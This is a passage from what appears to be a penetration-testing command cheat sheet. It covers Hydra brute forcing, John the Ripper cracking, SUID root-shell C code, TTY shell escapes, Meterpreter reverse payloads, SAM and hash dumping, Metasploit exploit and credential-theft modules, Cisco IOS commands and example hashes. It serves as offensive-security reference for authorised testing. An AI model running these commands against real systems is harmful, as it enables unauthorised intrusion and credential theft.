<td><code>python /usr/share/doc/python-impacket-doc/examples/&lt;br&gt;samrdump.py SNMP 192.168.X.XXX</code></td>
<td>Enmerate users from SNMP</td>
</tr>
<tr>
<td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt &lt;br&gt;(then grep)</code></td>
<td>Search for SNMP servers with nmap, grepable output</td>
</tr>
</tbody>
</table>
<h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><h3 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/usr/share/wordlists</code></td>
<td>Kali word lists</td>
</tr>
</tbody>
</table>
<h2 id="Brute-Forcing-Services"><a href="#Brute-Forcing-Services" class="headerlink" title="Brute Forcing Services"></a>Brute Forcing Services</h2><h3 id="Hydra-FTP-Brute-Force"><a href="#Hydra-FTP-Brute-Force" class="headerlink" title="Hydra FTP Brute Force"></a>Hydra FTP Brute Force</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f &lt;br&gt;192.168.X.XXX ftp -V</code></td>
<td>Hydra FTP brute force</td>
</tr>
</tbody>
</table>
<h3 id="Hydra-POP3-Brute-Force"><a href="#Hydra-POP3-Brute-Force" class="headerlink" title="Hydra POP3 Brute Force"></a>Hydra POP3 Brute Force</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f &lt;br&gt;192.168.X.XXX pop3 -V</code></td>
<td>Hydra POP3 brute force</td>
</tr>
</tbody>
</table>
<h3 id="Hydra-SMTP-Brute-Force"><a href="#Hydra-SMTP-Brute-Force" class="headerlink" title="Hydra SMTP Brute Force"></a>Hydra SMTP Brute Force</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td>
<td>Hydra SMTP brute force</td>
</tr>
</tbody>
</table>
<p>Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code></p>
<h2 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h2><p>Password cracking penetration testing tools.</p>
<h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td>
<td>JTR password cracking</td>
</tr>
<tr>
<td><code>john --format=descrypt --wordlist &lt;br&gt; /usr/share/wordlists/rockyou.txt hash.txt</code></td>
<td>JTR forced descrypt cracking with wordlist</td>
</tr>
<tr>
<td><code>john --format=descrypt hash --show</code></td>
<td>JTR forced descrypt brute force cracking</td>
</tr>
</tbody>
</table>
<h2 id="Windows-Penetration-Testing-Commands"><a href="#Windows-Penetration-Testing-Commands" class="headerlink" title="Windows Penetration Testing Commands"></a>Windows Penetration Testing Commands</h2><p>See <strong>Windows Penetration Testing Commands</strong>.</p>
<h2 id="Linux-Penetration-Testing-Commands"><a href="#Linux-Penetration-Testing-Commands" class="headerlink" title="Linux Penetration Testing Commands"></a>Linux Penetration Testing Commands</h2><p>See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.</p>
<h2 id="Compiling-Exploits"><a href="#Compiling-Exploits" class="headerlink" title="Compiling Exploits"></a>Compiling Exploits</h2><p>Some notes on compiling exploits.</p>
<h3 id="Identifying-if-C-code-is-for-Windows-or-Linux"><a href="#Identifying-if-C-code-is-for-Windows-or-Linux" class="headerlink" title="Identifying if C code is for Windows or Linux"></a>Identifying if C code is for Windows or Linux</h3><p>C #includes will indicate which OS should be used to build the exploit.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td>
<td>Windows exploit code</td>
</tr>
<tr>
<td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, &lt;br&gt; sys/sockt.h, sys/types.h, unistd.h</code></td>
<td>Linux exploit code</td>
</tr>
</tbody>
</table>
<h3 id="Build-Exploit-GCC"><a href="#Build-Exploit-GCC" class="headerlink" title="Build Exploit GCC"></a>Build Exploit GCC</h3><p>Compile exploit gcc.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gcc -o exploit exploit.c</code></td>
<td>Basic GCC compile</td>
</tr>
</tbody>
</table>
<h3 id="GCC-Compile-32Bit-Exploit-on-64Bit-Kali"><a href="#GCC-Compile-32Bit-Exploit-on-64Bit-Kali" class="headerlink" title="GCC Compile 32Bit Exploit on 64Bit Kali"></a>GCC Compile 32Bit Exploit on 64Bit Kali</h3><p>Handy for cross compiling 32 bit binaries on 64 bit attacking machines.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>gcc -m32 exploit.c -o exploit</code></td>
<td>Cross compile 32 bit binary on 64 bit Linux</td>
</tr>
</tbody>
</table>
<h3 id="Compile-Windows-exe-on-Linux"><a href="#Compile-Windows-exe-on-Linux" class="headerlink" title="Compile Windows .exe on Linux"></a>Compile Windows .exe on Linux</h3><p>Build / compile windows exploits on Linux, resulting in a .exe file.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td>
<td>Compile windows .exe on Linux</td>
</tr>
</tbody>
</table>
<h2 id="SUID-Binary"><a href="#SUID-Binary" class="headerlink" title="SUID Binary"></a>SUID Binary</h2><p>Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.</p>
<p>below are some quick copy and pate examples for various shells:</p>
<h3 id="SUID-C-Shell-for-bin-bash"><a href="#SUID-C-Shell-for-bin-bash" class="headerlink" title="SUID C Shell for /bin/bash"></a>SUID C Shell for /bin/bash</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">       setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">       system(<span class="string">"/bin/bash"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="SUID-C-Shell-for-bin-sh"><a href="#SUID-C-Shell-for-bin-sh" class="headerlink" title="SUID C Shell for /bin/sh"></a>SUID C Shell for /bin/sh</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</div><div class="line">       setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">       system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Building-the-SUID-Shell-binary"><a href="#Building-the-SUID-Shell-binary" class="headerlink" title="Building the SUID Shell binary"></a>Building the SUID Shell binary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -o suid suid.c</div></pre></td></tr></table></figure>
<p>For 32 bit:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -o suid suid.c</div></pre></td></tr></table></figure>
<h2 id="Reverse-Shells"><a href="#Reverse-Shells" class="headerlink" title="Reverse Shells"></a>Reverse Shells</h2><p>See <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="external">Reverse Shell Cheat Sheet</a> for a list of useful Reverse Shells.</p>
<h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p>
<h3 id="Python-TTY-Shell-Trick"><a href="#Python-TTY-Shell-Trick" class="headerlink" title="Python TTY Shell Trick"></a>Python TTY Shell Trick</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> os.system(<span class="string">'/bin/bash'</span>)</div></pre></td></tr></table></figure>
<h3 id="Spawn-Interactive-sh-shell"><a href="#Spawn-Interactive-sh-shell" class="headerlink" title="Spawn Interactive sh shell"></a>Spawn Interactive sh shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh -i</div></pre></td></tr></table></figure>
<h3 id="Spawn-Perl-TTY-Shell"><a href="#Spawn-Perl-TTY-Shell" class="headerlink" title="Spawn Perl TTY Shell"></a>Spawn Perl TTY Shell</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">exec</span> <span class="string">"/bin/sh"</span>;</div><div class="line">perl —e <span class="string">'exec "/bin/sh";'</span></div></pre></td></tr></table></figure>
<h3 id="Spawn-Ruby-TTY-Shell"><a href="#Spawn-Ruby-TTY-Shell" class="headerlink" title="Spawn Ruby TTY Shell"></a>Spawn Ruby TTY Shell</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exec <span class="string">"/bin/sh"</span></div></pre></td></tr></table></figure>
<h3 id="Spawn-Lua-TTY-Shell"><a href="#Spawn-Lua-TTY-Shell" class="headerlink" title="Spawn Lua TTY Shell"></a>Spawn Lua TTY Shell</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">os.execute(<span class="string">'/bin/sh'</span>)</div></pre></td></tr></table></figure>
<h3 id="Spawn-TTY-Shell-from-Vi"><a href="#Spawn-TTY-Shell-from-Vi" class="headerlink" title="Spawn TTY Shell from Vi"></a>Spawn TTY Shell from Vi</h3><p>Run shell commands from vi:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:!bash</div></pre></td></tr></table></figure>
<h3 id="Spawn-TTY-Shell-NMAP"><a href="#Spawn-TTY-Shell-NMAP" class="headerlink" title="Spawn TTY Shell NMAP"></a>Spawn TTY Shell NMAP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!sh</div></pre></td></tr></table></figure>
<h2 id="Metasploit-Cheat-Sheet"><a href="#Metasploit-Cheat-Sheet" class="headerlink" title="Metasploit Cheat Sheet"></a>Metasploit Cheat Sheet</h2><p>A basic metasploit cheat sheet that I have found handy for reference.</p>
<p>Basic Metasploit commands, useful for reference, for pivoting see - <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" target="_blank" rel="external">Meterpreter Pivoting</a> techniques.</p>
<h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-reverse-meterpreter-payload"><a href="#Windows-reverse-meterpreter-payload" class="headerlink" title="Windows reverse meterpreter payload"></a>Windows reverse meterpreter payload</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload windows/meterpreter/reverse_tcp</code></td>
<td>Windows reverse tcp payload</td>
</tr>
</tbody>
</table>
<h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload windows/vncinject/reverse_tcp</code> <code>set ViewOnly false</code></td>
<td>Meterpreter Windows VNC Payload</td>
</tr>
</tbody>
</table>
<h3 id="Linux-Reverse-Meterpreter-payload"><a href="#Linux-Reverse-Meterpreter-payload" class="headerlink" title="Linux Reverse Meterpreter payload"></a>Linux Reverse Meterpreter payload</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>set payload linux/meterpreter/reverse_tcp</code></td>
<td>Meterpreter Linux Reverse Payload</td>
</tr>
</tbody>
</table>
<h2 id="Meterpreter-Cheat-Sheet"><a href="#Meterpreter-Cheat-Sheet" class="headerlink" title="Meterpreter Cheat Sheet"></a>Meterpreter Cheat Sheet</h2><p>Useful meterpreter commands.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>upload file c:\\windows</code></td>
<td>Meterpreter upload file to Windows target</td>
</tr>
<tr>
<td><code>download c:\\windows\\repair\\sam /tmp</code></td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td><code>download c:\\windows\\repair\\sam /tmp</code></td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td><code>execute -f c:\\windows\temp\exploit.exe</code></td>
<td>Meterpreter run .exe on target - handy for executing uploaded exploits</td>
</tr>
<tr>
<td><code>execute -f cmd -c</code></td>
<td>Creates new channel with cmd shell</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>Meterpreter show processes</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>Meterpreter get shell on the target</td>
</tr>
<tr>
<td><code>getsystem</code></td>
<td>Meterpreter attempts priviledge escalation the target</td>
</tr>
<tr>
<td><code>hashdump</code></td>
<td>Meterpreter attempts to dump the hashes on the target</td>
</tr>
<tr>
<td><code>portfwd add &amp;#x2013;l 3389 &amp;#x2013;p 3389 &amp;#x2013;r target</code></td>
<td>Meterpreter create port forward to target machine</td>
</tr>
<tr>
<td><code>portfwd delete &amp;#x2013;l 3389 &amp;#x2013;p 3389 &amp;#x2013;r target</code></td>
<td>Meterpreter delete port forward</td>
</tr>
</tbody>
</table>
<h2 id="Common-Metasploit-Modules"><a href="#Common-Metasploit-Modules" class="headerlink" title="Common Metasploit Modules"></a>Common Metasploit Modules</h2><p>Top metasploit modules.</p>
<h3 id="Remote-Windows-Metasploit-Modules-exploits"><a href="#Remote-Windows-Metasploit-Modules-exploits" class="headerlink" title="Remote Windows Metasploit Modules (exploits)"></a>Remote Windows Metasploit Modules (exploits)</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/windows/smb/ms08_067_netapi</code></td>
<td>MS08_067 Windows 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td>
<td>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td><code>use exploit/windows/smb/&lt;br&gt;ms09_050_smb2_negotiate_func_index</code></td>
<td>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</td>
</tr>
</tbody>
</table>
<h3 id="Local-Windows-Metasploit-Modules-exploits"><a href="#Local-Windows-Metasploit-Modules-exploits" class="headerlink" title="Local Windows Metasploit Modules (exploits)"></a>Local Windows Metasploit Modules (exploits)</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/windows/local/bypassuac</code></td>
<td>Bypass UAC on Windows 7 + Set target + arch, x86/64</td>
</tr>
</tbody>
</table>
<h3 id="Auxilary-Metasploit-Modules"><a href="#Auxilary-Metasploit-Modules" class="headerlink" title="Auxilary Metasploit Modules"></a>Auxilary Metasploit Modules</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use auxiliary/scanner/http/dir_scanner</code></td>
<td>Metasploit HTTP directory scanner</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td>
<td>Metasploit JBOSS vulnerability scanner</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mssql/mssql_login</code></td>
<td>Metasploit MSSQL Credential Scanner</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/mysql/mysql_version</code></td>
<td>Metasploit MSSQL Version Scanner</td>
</tr>
<tr>
<td><code>use auxiliary/scanner/oracle/oracle_login</code></td>
<td>Metasploit Oracle Login Module</td>
</tr>
</tbody>
</table>
<h3 id="Metasploit-Powershell-Modules"><a href="#Metasploit-Powershell-Modules" class="headerlink" title="Metasploit Powershell Modules"></a>Metasploit Powershell Modules</h3><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>use exploit/multi/script/web_delivery</code></td>
<td>Metasploit powershell payload delivery module</td>
</tr>
<tr>
<td><code>post/windows/manage/powershell/exec_powershell</code></td>
<td>Metasploit upload and run powershell script through a session</td>
</tr>
<tr>
<td><code>use exploit/multi/http/jboss_maindeployer</code></td>
<td>Metasploit JBOSS deploy</td>
</tr>
<tr>
<td><code>use exploit/windows/mssql/mssql_payload</code></td>
<td>Metasploit MSSQL payload</td>
</tr>
</tbody>
</table>
<h3 id="Post-Exploit-Windows-Metasploit-Modules"><a href="#Post-Exploit-Windows-Metasploit-Modules" class="headerlink" title="Post Exploit Windows Metasploit Modules"></a>Post Exploit Windows Metasploit Modules</h3><p>Windows Metasploit Modules for privilege escalation.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>run post/windows/gather/win_privs</code></td>
<td>Metasploit show privileges of current user</td>
</tr>
<tr>
<td><code>use post/windows/gather/credentials/gpp</code></td>
<td>Metasploit grab GPP saved passwords</td>
</tr>
<tr>
<td><code>load mimikatz -&gt; wdigest</code></td>
<td>Metasplit load Mimikatz</td>
</tr>
<tr>
<td><code>run post/windows/gather/local_admin_search_enum</code></td>
<td>Idenitfy other machines that the supplied domain user has administrative access to</td>
</tr>
<tr>
<td><code>run post/windows/gather/smart_hashdump</code></td>
<td>Automated dumping of sam file, tries to esc privileges etc</td>
</tr>
</tbody>
</table>
<h2 id="ASCII-Table-Cheat-Sheet"><a href="#ASCII-Table-Cheat-Sheet" class="headerlink" title="ASCII Table Cheat Sheet"></a>ASCII Table Cheat Sheet</h2><p>Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.</p>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>Character</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>x00</code></td>
<td>Null Byte</td>
</tr>
<tr>
<td><code>x08</code></td>
<td>BS</td>
</tr>
<tr>
<td><code>x09</code></td>
<td>TAB</td>
</tr>
<tr>
<td><code>x0a</code></td>
<td>LF</td>
</tr>
<tr>
<td><code>x0d</code></td>
<td>CR</td>
</tr>
<tr>
<td><code>x1b</code></td>
<td>ESC</td>
</tr>
<tr>
<td><code>x20</code></td>
<td>SPC</td>
</tr>
<tr>
<td><code>x21</code></td>
<td>!</td>
</tr>
<tr>
<td><code>x22</code></td>
<td>“</td>
</tr>
<tr>
<td><code>x23</code></td>
<td>#</td>
</tr>
<tr>
<td><code>x24</code></td>
<td>$</td>
</tr>
<tr>
<td><code>x25</code></td>
<td>%</td>
</tr>
<tr>
<td><code>x26</code></td>
<td>&amp;</td>
</tr>
<tr>
<td><code>x27</code></td>
<td>`</td>
</tr>
<tr>
<td><code>x28</code></td>
<td>(</td>
</tr>
<tr>
<td><code>x29</code></td>
<td>)</td>
</tr>
<tr>
<td><code>x2a</code></td>
<td>*</td>
</tr>
<tr>
<td><code>x2b</code></td>
<td>+</td>
</tr>
<tr>
<td><code>x2c</code></td>
<td>,</td>
</tr>
<tr>
<td><code>x2d</code></td>
<td>-</td>
</tr>
<tr>
<td><code>x2e</code></td>
<td>.</td>
</tr>
<tr>
<td><code>x2f</code></td>
<td>/</td>
</tr>
<tr>
<td><code>x30</code></td>
<td>0</td>
</tr>
<tr>
<td><code>x31</code></td>
<td>1</td>
</tr>
<tr>
<td><code>x32</code></td>
<td>2</td>
</tr>
<tr>
<td><code>x33</code></td>
<td>3</td>
</tr>
<tr>
<td><code>x34</code></td>
<td>4</td>
</tr>
<tr>
<td><code>x35</code></td>
<td>5</td>
</tr>
<tr>
<td><code>x36</code></td>
<td>6</td>
</tr>
<tr>
<td><code>x37</code></td>
<td>7</td>
</tr>
<tr>
<td><code>x38</code></td>
<td>8</td>
</tr>
<tr>
<td><code>x39</code></td>
<td>9</td>
</tr>
<tr>
<td><code>x3a</code></td>
<td>:</td>
</tr>
<tr>
<td><code>x3b</code></td>
<td>;</td>
</tr>
<tr>
<td><code>x3c</code></td>
<td>&lt;</td>
</tr>
<tr>
<td><code>x3d</code></td>
<td>=</td>
</tr>
<tr>
<td><code>x3e</code></td>
<td>&gt;</td>
</tr>
<tr>
<td><code>x3f</code></td>
<td>?</td>
</tr>
<tr>
<td><code>x40</code></td>
<td>@</td>
</tr>
<tr>
<td><code>x41</code></td>
<td>A</td>
</tr>
<tr>
<td><code>x42</code></td>
<td>B</td>
</tr>
<tr>
<td><code>x43</code></td>
<td>C</td>
</tr>
<tr>
<td><code>x44</code></td>
<td>D</td>
</tr>
<tr>
<td><code>x45</code></td>
<td>E</td>
</tr>
<tr>
<td><code>x46</code></td>
<td>F</td>
</tr>
<tr>
<td><code>x47</code></td>
<td>G</td>
</tr>
<tr>
<td><code>x48</code></td>
<td>H</td>
</tr>
<tr>
<td><code>x49</code></td>
<td>I</td>
</tr>
<tr>
<td><code>x4a</code></td>
<td>J</td>
</tr>
<tr>
<td><code>x4b</code></td>
<td>K</td>
</tr>
<tr>
<td><code>x4c</code></td>
<td>L</td>
</tr>
<tr>
<td><code>x4d</code></td>
<td>M</td>
</tr>
<tr>
<td><code>x4e</code></td>
<td>N</td>
</tr>
<tr>
<td><code>x4f</code></td>
<td>O</td>
</tr>
<tr>
<td><code>x50</code></td>
<td>P</td>
</tr>
<tr>
<td><code>x51</code></td>
<td>Q</td>
</tr>
<tr>
<td><code>x52</code></td>
<td>R</td>
</tr>
<tr>
<td><code>x53</code></td>
<td>S</td>
</tr>
<tr>
<td><code>x54</code></td>
<td>T</td>
</tr>
<tr>
<td><code>x55</code></td>
<td>U</td>
</tr>
<tr>
<td><code>x56</code></td>
<td>V</td>
</tr>
<tr>
<td><code>x57</code></td>
<td>W</td>
</tr>
<tr>
<td><code>x58</code></td>
<td>X</td>
</tr>
<tr>
<td><code>x59</code></td>
<td>Y</td>
</tr>
<tr>
<td><code>x5a</code></td>
<td>Z</td>
</tr>
<tr>
<td><code>x5b</code></td>
<td>[</td>
</tr>
<tr>
<td><code>x5c</code></td>
<td>\</td>
</tr>
<tr>
<td><code>x5d</code></td>
<td>]</td>
</tr>
<tr>
<td><code>x5e</code></td>
<td>^</td>
</tr>
<tr>
<td><code>x5f</code></td>
<td>_</td>
</tr>
<tr>
<td><code>x60</code></td>
<td>`</td>
</tr>
<tr>
<td><code>x61</code></td>
<td>a</td>
</tr>
<tr>
<td><code>x62</code></td>
<td>b</td>
</tr>
<tr>
<td><code>x63</code></td>
<td>c</td>
</tr>
<tr>
<td><code>x64</code></td>
<td>d</td>
</tr>
<tr>
<td><code>x65</code></td>
<td>e</td>
</tr>
<tr>
<td><code>x66</code></td>
<td>f</td>
</tr>
<tr>
<td><code>x67</code></td>
<td>g</td>
</tr>
<tr>
<td><code>x68</code></td>
<td>h</td>
</tr>
<tr>
<td><code>x69</code></td>
<td>i</td>
</tr>
<tr>
<td><code>x6a</code></td>
<td>j</td>
</tr>
<tr>
<td><code>x6b</code></td>
<td>k</td>
</tr>
<tr>
<td><code>x6c</code></td>
<td>l</td>
</tr>
<tr>
<td><code>x6d</code></td>
<td>m</td>
</tr>
<tr>
<td><code>x6e</code></td>
<td>n</td>
</tr>
<tr>
<td><code>x6f</code></td>
<td>o</td>
</tr>
<tr>
<td><code>x70</code></td>
<td>p</td>
</tr>
<tr>
<td><code>x71</code></td>
<td>q</td>
</tr>
<tr>
<td><code>x72</code></td>
<td>r</td>
</tr>
<tr>
<td><code>x73</code></td>
<td>s</td>
</tr>
<tr>
<td><code>x74</code></td>
<td>t</td>
</tr>
<tr>
<td><code>x75</code></td>
<td>u</td>
</tr>
<tr>
<td><code>x76</code></td>
<td>v</td>
</tr>
<tr>
<td><code>x77</code></td>
<td>w</td>
</tr>
<tr>
<td><code>x78</code></td>
<td>x</td>
</tr>
<tr>
<td><code>x79</code></td>
<td>y</td>
</tr>
<tr>
<td><code>x7a</code></td>
<td>z</td>
</tr>
</tbody>
</table>
<h2 id="CISCO-IOS-Commands"><a href="#CISCO-IOS-Commands" class="headerlink" title="CISCO IOS Commands"></a>CISCO IOS Commands</h2><p>A collection of useful Cisco IOS commands.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>enable</code></td>
<td>Enters enable mode</td>
</tr>
<tr>
<td><code>conf t</code></td>
<td>Short for, configure terminal</td>
</tr>
<tr>
<td><code>(config)# interface fa0/0</code></td>
<td>Configure FastEthernet 0/0</td>
</tr>
<tr>
<td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td>
<td>Add ip to fa0/0</td>
</tr>
<tr>
<td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td>
<td>Add ip to fa0/0</td>
</tr>
<tr>
<td><code>(config-if)# line vty 0 4</code></td>
<td>Configure vty line</td>
</tr>
<tr>
<td><code>(config-line)# login</code></td>
<td>Cisco set telnet password</td>
</tr>
<tr>
<td><code>(config-line)# password YOUR-PASSWORD</code></td>
<td>Set telnet password</td>
</tr>
<tr>
<td><code># show running-config</code></td>
<td>Show running config loaded in memory</td>
</tr>
<tr>
<td><code># show startup-config</code></td>
<td>Show sartup config</td>
</tr>
<tr>
<td><code># show version</code></td>
<td>show cisco IOS version</td>
</tr>
<tr>
<td><code># show session</code></td>
<td>display open sessions</td>
</tr>
<tr>
<td><code># show ip interface</code></td>
<td>Show network interfaces</td>
</tr>
<tr>
<td><code># show interface e0</code></td>
<td>Show detailed interface info</td>
</tr>
<tr>
<td><code># show ip route</code></td>
<td>Show routes</td>
</tr>
<tr>
<td><code># show access-lists</code></td>
<td>Show access lists</td>
</tr>
<tr>
<td><code># dir file systems</code></td>
<td>Show available files</td>
</tr>
<tr>
<td><code># dir all-filesystems</code></td>
<td>File information</td>
</tr>
<tr>
<td><code># dir /all</code></td>
<td>SHow deleted files</td>
</tr>
<tr>
<td><code># terminal length 0</code></td>
<td>No limit on terminal output</td>
</tr>
<tr>
<td><code># copy running-config tftp</code></td>
<td>Copys running config to tftp server</td>
</tr>
<tr>
<td><code># copy running-config startup-config</code></td>
<td>Copy startup-config to running-config</td>
</tr>
</tbody>
</table>
<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="Hash-Lengths"><a href="#Hash-Lengths" class="headerlink" title="Hash Lengths"></a>Hash Lengths</h3><table>
<thead>
<tr>
<th>Hash</th>
<th>Size</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Length</td>
<td><code>16 Bytes</code></td>
</tr>
<tr>
<td>SHA-1 Hash Length</td>
<td><code>20 Bytes</code></td>
</tr>
<tr>
<td>SHA-256 Hash Length</td>
<td><code>32 Bytes</code></td>
</tr>
<tr>
<td>SHA-512 Hash Length</td>
<td><code>64 Bytes</code></td>
</tr>
</tbody>
</table>
<h3 id="Hash-Examples"><a href="#Hash-Examples" class="headerlink" title="Hash Examples"></a>Hash Examples</h3><p>Likely just use <strong>hash-identifier</strong> for this but here are some example hashes:</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Example</td>
<td><code>8743b52063cd84097a65d1633f5c74f5</code></td>
</tr>
<tr>
<td>MD5 $PASS:$SALT Example</td>
<td><code>01dfae6e5d4d90d9892622325959afbe:7050461</code></td>
</tr>
<tr>
<td>MD5 $SALT:$PASS</td>
<td><code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code></td>
</tr>
<tr>
<td>SHA1 Hash Example</td>
<td><code>b89eaac7e61417341b710b727768294d0e6a277b</code></td>
</tr>
<tr>
<td>SHA1 $PASS:$SALT</td>
<td><code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code></td>
</tr>
<tr>
<td>SHA1 $SALT:$PASS</td>
<td><code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code></td>
</tr>
<tr>
<td>SHA-256</td>
<td><code>127e6fbfe24a750e72930c220a8e138275656b&lt;br&gt;8e5d8f48a98c3c92df2caba935</code></td>
</tr>
<tr>
<td>SHA-256 $PASS:$SALT</td>
<td><code>c73d08de890479518ed60cf670d17faa26a4a7&lt;br&gt;1f995c1dcc978165399401a6c4</code></td>
</tr>
<tr>
